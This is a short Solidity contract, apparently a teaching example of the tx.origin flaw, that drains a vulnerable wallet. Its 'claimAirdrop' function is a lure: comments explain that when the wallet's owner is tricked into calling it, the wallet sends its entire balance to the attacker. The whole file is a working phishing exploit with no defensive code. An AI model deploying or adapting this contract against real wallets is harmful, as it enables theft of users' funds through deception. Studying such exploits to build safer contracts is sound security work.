// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWallet { function transferTo(address payable dest, uint256 amount) external; }

// Looks innocent ("claim your airdrop"). When the OWNER calls it, tx.origin
// is the owner, so it can order the vulnerable wallet to pay the attacker.
contract Attack {
    IWallet public wallet;
    address payable public attacker;
    constructor(address _wallet, address payable _attacker) {
        wallet = IWallet(_wallet);
        attacker = _attacker;
    }
    function claimAirdrop() external {                 // owner is tricked into calling this
        wallet.transferTo(attacker, address(wallet).balance);
    }
}
